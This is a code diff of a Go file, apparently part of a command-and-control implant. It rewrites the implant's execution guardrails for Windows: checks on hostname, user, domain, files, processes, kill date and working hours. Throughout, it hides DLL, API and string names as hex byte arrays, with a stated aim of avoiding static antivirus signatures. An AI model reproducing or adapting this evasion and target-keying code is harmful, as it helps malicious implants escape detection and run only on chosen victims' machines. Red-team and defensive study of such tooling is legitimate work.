@@ -1,4 +1,4 @@
-// server/docker/payloads/Windows/safety_checks_windows.go
+// server/docker/payloads/SMB_Windows/exec_requirements_windows.go
 //go:build windows
 // +build windows
 
@@ -7,13 +7,14 @@ package main
 import (
 	"fmt"
 	"os"
-	"os/exec"
-	"os/user"
 	"path/filepath"
 	"strings"
+	"syscall"
 	"time"
+	"unsafe"
 
 	"github.com/shirou/gopsutil/v4/process"
+	"golang.org/x/sys/windows"
 )
 
 // Build-time variables that will be set via ldflags
@@ -30,6 +31,66 @@ var (
 	safetyWorkHoursEnd   string = ""
 )
 
+// Exec requirements strings (constructed to avoid static signatures)
+var (
+	// DLL names
+	erDllNetapi32 = string([]byte{0x6e, 0x65, 0x74, 0x61, 0x70, 0x69, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c})                                                 // netapi32.dll
+	erDllSecur32  = string([]byte{0x73, 0x65, 0x63, 0x75, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c})                                                       // secur32.dll
+
+	// Proc names
+	erProcNetGetJoinInfo = string([]byte{0x4e, 0x65, 0x74, 0x47, 0x65, 0x74, 0x4a, 0x6f, 0x69, 0x6e, 0x49, 0x6e, 0x66, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x69, 0x6f, 0x6e}) // NetGetJoinInformation
+	erProcNetApiBufFree  = string([]byte{0x4e, 0x65, 0x74, 0x41, 0x70, 0x69, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72, 0x46, 0x72, 0x65, 0x65})                               // NetApiBufferFree
+	erProcGetUserNameEx  = string([]byte{0x47, 0x65, 0x74, 0x55, 0x73, 0x65, 0x72, 0x4e, 0x61, 0x6d, 0x65, 0x45, 0x78, 0x57})                                           // GetUserNameExW
+
+	// Environment variable names
+	erEnvUsername    = string([]byte{0x55, 0x53, 0x45, 0x52, 0x4e, 0x41, 0x4d, 0x45})                                     // USERNAME
+	erEnvUserDnsDom  = string([]byte{0x55, 0x53, 0x45, 0x52, 0x44, 0x4e, 0x53, 0x44, 0x4f, 0x4d, 0x41, 0x49, 0x4e})       // USERDNSDOMAIN
+	erEnvUserDomain  = string([]byte{0x55, 0x53, 0x45, 0x52, 0x44, 0x4f, 0x4d, 0x41, 0x49, 0x4e})                         // USERDOMAIN
+	erEnvLogonServer = string([]byte{0x4c, 0x4f, 0x47, 0x4f, 0x4e, 0x53, 0x45, 0x52, 0x56, 0x45, 0x52})                   // LOGONSERVER
+	erEnvUserProfile = string([]byte{0x55, 0x53, 0x45, 0x52, 0x50, 0x52, 0x4f, 0x46, 0x49, 0x4c, 0x45})                   // USERPROFILE
+
+	// String literals
+	erWordTrue       = string([]byte{0x74, 0x72, 0x75, 0x65})                                                             // true
+	erWordExe        = string([]byte{0x2e, 0x65, 0x78, 0x65})                                                             // .exe
+	erPathTildeBack  = string([]byte{0x7e, 0x5c})                                                                         // ~\
+	erPathTildeFwd   = string([]byte{0x7e, 0x2f})                                                                         // ~/
+	erDoubleBacksl   = string([]byte{0x5c, 0x5c})                                                                         // \\
+
+	// Time format strings
+	erTimeFmtFull  = string([]byte{0x32, 0x30, 0x30, 0x36, 0x2d, 0x30, 0x31, 0x2d, 0x30, 0x32, 0x20, 0x31, 0x35, 0x3a, 0x30, 0x34, 0x3a, 0x30, 0x35}) // 2006-01-02 15:04:05
+	erTimeFmtDate  = string([]byte{0x32, 0x30, 0x30, 0x36, 0x2d, 0x30, 0x31, 0x2d, 0x30, 0x32})                                                       // 2006-01-02
+)
+
+// Windows API constants
+const (
+	NetSetupUnknownStatus = iota
+	NetSetupUnjoined
+	NetSetupWorkgroupName
+	NetSetupDomainName
+)
+
+var (
+	modNetapi32               = windows.NewLazySystemDLL(erDllNetapi32)
+	modSecur32                = windows.NewLazySystemDLL(erDllSecur32)
+	procNetGetJoinInformation = modNetapi32.NewProc(erProcNetGetJoinInfo)
+	procNetApiBufferFree      = modNetapi32.NewProc(erProcNetApiBufFree)
+	procGetUserNameExW        = modSecur32.NewProc(erProcGetUserNameEx)
+)
+
+// NameFormat constants for GetUserNameEx
+const (
+	NameUnknown          = 0
+	NameFullyQualifiedDN = 1
+	NameSamCompatible    = 2
+	NameDisplay          = 3
+	NameUniqueId         = 6
+	NameCanonical        = 7
+	NameUserPrincipal    = 8
+	NameCanonicalEx      = 9
+	NameServicePrincipal = 10
+	NameDnsDomain        = 12
+)
+
 // PerformSafetyChecks runs all configured safety checks
 // Returns true if all checks pass, false otherwise
 func PerformSafetyChecks() bool {
@@ -37,10 +98,6 @@ func PerformSafetyChecks() bool {
 	if !hasSafetyChecks() {
 		return true
 	}
-
-	// Silent checks - no output in production
-	// Uncomment for debugging only
-	// fmt.Println("[*] Performing safety checks...")
 
 	// Check hostname
 	if safetyHostname != "" {
@@ -56,7 +113,7 @@ func PerformSafetyChecks() bool {
 		}
 	}
 
-	// Check domain (Active Directory binding)
+	// Check domain
 	if safetyDomain != "" {
 		if !checkDomain(safetyDomain) {
 			return false
@@ -65,7 +122,7 @@ func PerformSafetyChecks() bool {
 
 	// Check file existence
 	if safetyFilePath != "" {
-		mustExist := safetyFileMustExist == "true"
+		mustExist := safetyFileMustExist == erWordTrue
 		if !checkFile(safetyFilePath, mustExist) {
 			return false
 		}
@@ -112,165 +169,132 @@ func checkHostname(expected string) bool {
 	if err != nil {
 		return false
 	}
-
-	// Also check using scutil for local hostname
-	if !strings.EqualFold(hostname, expected) {
-		cmd := exec.Command("scutil", "--get", "LocalHostName")
-		output, err := cmd.Output()
-		if err == nil {
-			hostname = strings.TrimSpace(string(output))
-		}
-	}
-
-	// Case-insensitive comparison
 	return strings.EqualFold(hostname, expected)
 }
 
 // checkUsername verifies the current username matches the expected value
 func checkUsername(expected string) bool {
-	currentUser, err := user.Current()
-	if err != nil {
-		// Fallback to environment variable
-		username := os.Getenv("USER")
-		if username == "" {
-			username = os.Getenv("LOGNAME")
+	// Method 1: Use Windows API GetUserNameExW for SAM compatible name
+	if username := getUserNameEx(NameSamCompatible); username != "" {
+		// SAM format is DOMAIN\Username, extract just username
+		if idx := strings.LastIndex(username, "\\"); idx >= 0 {
+			username = username[idx+1:]
 		}
-		return strings.EqualFold(username, expected)
+		if strings.EqualFold(username, expected) {
+			return true
+		}
 	}
 
-	// Case-insensitive comparison
-	return strings.EqualFold(currentUser.Username, expected)
+	// Method 2: Environment variable fallback
+	username := os.Getenv(erEnvUsername)
+	if username != "" && strings.EqualFold(username, expected) {
+		return true
+	}
+
+	return false
 }
 
-// checkDomain checks if the Mac is bound to an Active Directory domain
+// getUserNameEx calls the Windows GetUserNameExW API
+func getUserNameEx(nameFormat int) string {
+	var size uint32 = 256
+	buf := make([]uint16, size)
+
+	ret, _, _ := procGetUserNameExW.Call(
+		uintptr(nameFormat),
+		uintptr(unsafe.Pointer(&buf[0])),
+		uintptr(unsafe.Pointer(&size)),
+	)
+
+	if ret == 0 {
+		return ""
+	}
+
+	return syscall.UTF16ToString(buf[:size])
+}
+
+// checkDomain checks if the machine is joined to the specified Active Directory domain
 func checkDomain(expected string) bool {
-	// Method 1: Check using dsconfigad
-	if domain := checkADDomainDSConfig(); domain != "" {
+	// Method 1: Use NetGetJoinInformation API (most reliable)
+	if domain := getJoinedDomain(); domain != "" {
 		if strings.EqualFold(domain, expected) {
+			return true
+		}
+		// Also check if the expected is a substring (e.g., "CORP" matches "CORP.EXAMPLE.COM")
+		if strings.Contains(strings.ToUpper(domain), strings.ToUpper(expected)) {
 			return true
 		}
 	}
 
-	// Method 2: Check using dscl (Directory Service command line)
-	if domain := checkADDomainDSCL(); domain != "" {
-		if strings.EqualFold(domain, expected) {
+	// Method 2: Check USERDNSDOMAIN environment variable (set for domain users)
+	if dnsDomain := os.Getenv(erEnvUserDnsDom); dnsDomain != "" {
+		if strings.EqualFold(dnsDomain, expected) {
+			return true
+		}
+		if strings.Contains(strings.ToUpper(dnsDomain), strings.ToUpper(expected)) {
 			return true
 		}
 	}
 
-	// Method 3: Check Kerberos configuration
-	if realm := checkKerberosRealm(); realm != "" {
-		if strings.EqualFold(realm, expected) {
+	// Method 3: Check USERDOMAIN environment variable (NetBIOS domain name)
+	if userDomain := os.Getenv(erEnvUserDomain); userDomain != "" {
+		if strings.EqualFold(userDomain, expected) {
 			return true
 		}
 	}
 
-	// Method 4: Check Open Directory
-	if domain := checkOpenDirectory(); domain != "" {
-		if strings.EqualFold(domain, expected) {
-			return true
+	// Method 4: Check LOGONSERVER (indicates domain controller)
+	if logonServer := os.Getenv(erEnvLogonServer); logonServer != "" {
+		// LOGONSERVER format is \\SERVERNAME
+		// If it's set and not the local machine, likely domain-joined
+		hostname, _ := os.Hostname()
+		serverName := strings.TrimPrefix(logonServer, erDoubleBacksl)
+		if !strings.EqualFold(serverName, hostname) {
+			// Machine is using a domain controller, check other indicators
+			if userDomain := os.Getenv(erEnvUserDomain); userDomain != "" {
+				if strings.EqualFold(userDomain, expected) {
+					return true
+				}
+			}
 		}
 	}
 
 	return false
 }
 
-// checkADDomainDSConfig checks Active Directory binding using dsconfigad
-func checkADDomainDSConfig() string {
-	cmd := exec.Command("dsconfigad", "-show")
-	output, err := cmd.Output()
-	if err != nil {
+// getJoinedDomain uses NetGetJoinInformation to get the domain name
+func getJoinedDomain() string {
+	var nameBuffer *uint16
+	var joinStatus uint32
+
+	ret, _, _ := procNetGetJoinInformation.Call(
+		0, // Local computer
+		uintptr(unsafe.Pointer(&nameBuffer)),
+		uintptr(unsafe.Pointer(&joinStatus)),
+	)
+
+	if ret != 0 {
 		return ""
 	}
 
-	lines := strings.Split(string(output), "\n")
-	for _, line := range lines {
-		line = strings.TrimSpace(line)
-		// Look for "Active Directory Domain = domain.com"
-		if strings.HasPrefix(line, "Active Directory Domain") {
-			parts := strings.Split(line, "=")
-			if len(parts) > 1 {
-				return strings.TrimSpace(parts[1])
-			}
-		}
-	}
+	defer procNetApiBufferFree.Call(uintptr(unsafe.Pointer(nameBuffer)))
 
-	return ""
-}
-
-// checkADDomainDSCL checks Active Directory using dscl
-func checkADDomainDSCL() string {
-	cmd := exec.Command("dscl", "localhost", "-list", "/Active Directory")
-	output, err := cmd.Output()
-	if err != nil {
+	// Only return domain name if actually joined to a domain
+	if joinStatus != NetSetupDomainName {
 		return ""
 	}
 
-	// Output will list AD domains
-	domains := strings.Split(strings.TrimSpace(string(output)), "\n")
-	if len(domains) > 0 && domains[0] != "" {
-		return domains[0]
-	}
-
-	return ""
-}
-
-// checkKerberosRealm checks for Kerberos configuration
-func checkKerberosRealm() string {
-	// Check /etc/krb5.conf
-	configPaths := []string{
-		"/etc/krb5.conf",
-		"/Library/Preferences/edu.mit.Kerberos",
-	}
-
-	for _, path := range configPaths {
-		if data, err := os.ReadFile(path); err == nil {
-			lines := strings.Split(string(data), "\n")
-			for _, line := range lines {
-				line = strings.TrimSpace(line)
-				if strings.HasPrefix(strings.ToLower(line), "default_realm") {
-					if strings.Contains(line, "=") {
-						parts := strings.Split(line, "=")
-						if len(parts) > 1 {
-							return strings.TrimSpace(parts[1])
-						}
-					}
-				}
-			}
-		}
-	}
-
-	return ""
-}
-
-// checkOpenDirectory checks if bound to Open Directory
-func checkOpenDirectory() string {
-	cmd := exec.Command("dscl", "localhost", "-read", "/")
-	output, err := cmd.Output()
-	if err != nil {
-		return ""
-	}
-
-	// Parse output for Open Directory server
-	lines := strings.Split(string(output), "\n")
-	for _, line := range lines {
-		if strings.Contains(line, "ServerConnection") {
-			// Extract server name
-			parts := strings.Fields(line)
-			if len(parts) > 1 {
-				return parts[len(parts)-1]
-			}
-		}
-	}
-
-	return ""
+	// Convert UTF16 pointer to Go string
+	return windows.UTF16PtrToString(nameBuffer)
 }
 
 // checkFile verifies file existence based on the requirement
 func checkFile(path string, mustExist bool) bool {
-	// Expand ~ to home directory if present
-	if strings.HasPrefix(path, "~/") {
-		if home, err := os.UserHomeDir(); err == nil {
+	// Expand environment variables in path
+	path = os.ExpandEnv(path)
+
+	// Expand ~ to user profile directory
+	if strings.HasPrefix(path, erPathTildeBack) || strings.HasPrefix(path, erPathTildeFwd) {
+		if home := os.Getenv(erEnvUserProfile); home != "" {
 			path = filepath.Join(home, path[2:])
 		}
 	}
@@ -278,52 +302,18 @@ func checkFile(path string, mustExist bool) bool {
 	_, err := os.Stat(path)
 
 	if mustExist {
-		// File must exist - check passes if no error
 		return err == nil
 	} else {
-		// File must NOT exist - check passes if error (file not found)
 		return os.IsNotExist(err)
 	}
 }
 
-// checkProcess checks if a specific process is running
+// checkProcess checks if a specific process is running using Windows APIs
 func checkProcess(processName string) bool {
-	// Method 1: Use ps command (more reliable on macOS)
-	if checkProcessViaPS(processName) {
-		return true
-	}
+	// Normalize the process name (remove .exe if present for comparison)
+	searchName := strings.TrimSuffix(strings.ToLower(processName), erWordExe)
 
-	// Method 2: Use gopsutil as fallback
-	return checkProcessGopsutil(processName)
-}
-
-// checkProcessViaPS uses the ps command to check for processes
-func checkProcessViaPS(processName string) bool {
-	// Use ps with wide output to avoid truncation
-	cmd := exec.Command("ps", "aux")
-	output, err := cmd.Output()
-	if err != nil {
-		return false
-	}
-
-	lines := strings.Split(string(output), "\n")
-	for _, line := range lines {
-		if strings.Contains(strings.ToLower(line), strings.ToLower(processName)) {
-			return true
-		}
-	}
-
-	// Also check using pgrep for exact matches
-	cmd = exec.Command("pgrep", "-i", processName)
-	if err := cmd.Run(); err == nil {
-		return true
-	}
-
-	return false
-}
-
-// checkProcessGopsutil uses gopsutil library for process checking
-func checkProcessGopsutil(processName string) bool {
+	// Use gopsutil which properly uses Windows APIs internally
 	processes, err := process.Processes()
 	if err != nil {
 		return false
@@ -335,19 +325,16 @@ func checkProcessGopsutil(processName string) bool {
 			continue
 		}
 
-		// Check exact name match
-		if strings.EqualFold(name, processName) {
+		// Normalize the found process name
+		foundName := strings.TrimSuffix(strings.ToLower(name), erWordExe)
+
+		// Exact match
+		if foundName == searchName {
 			return true
 		}
 
-		// For .app bundles, check if the name contains the process
-		if strings.Contains(strings.ToLower(name), strings.ToLower(processName)) {
-			return true
-		}
-
-		// Also check command line
-		cmdline, err := p.Cmdline()
-		if err == nil && strings.Contains(strings.ToLower(cmdline), strings.ToLower(processName)) {
+		// Partial match for things like "chrome" matching "chrome.exe"
+		if strings.Contains(foundName, searchName) {
 			return true
 		}
 	}
@@ -358,13 +345,15 @@ func checkProcessGopsutil(processName string) bool {
 // checkKillDate verifies the current date is before the kill date
 func checkKillDate(killDateStr string) bool {
 	// Parse kill date (format: "2006-01-02 15:04:05")
-	killDate, err := time.Parse("2006-01-02 15:04:05", killDateStr)
+	killDate, err := time.Parse(erTimeFmtFull, killDateStr)
 	if err != nil {
-		// If we can't parse the kill date, fail safe and don't run
-		return false
+		// Try alternate format without time
+		killDate, err = time.Parse(erTimeFmtDate, killDateStr)
+		if err != nil {
+			return false
+		}
 	}
 
-	// Check if current time is before kill date
 	return time.Now().Before(killDate)
 }
 
@@ -396,6 +385,5 @@ func checkWorkingHours(startTime, endTime string) bool {
 	startToday := time.Date(now.Year(), now.Month(), now.Day(), startHour, startMin, 0, 0, now.Location())
 	endToday := time.Date(now.Year(), now.Month(), now.Day(), endHour, endMin, 0, 0, now.Location())
 
-	// Check if current time is within range
 	return now.After(startToday) && now.Before(endToday)
 }
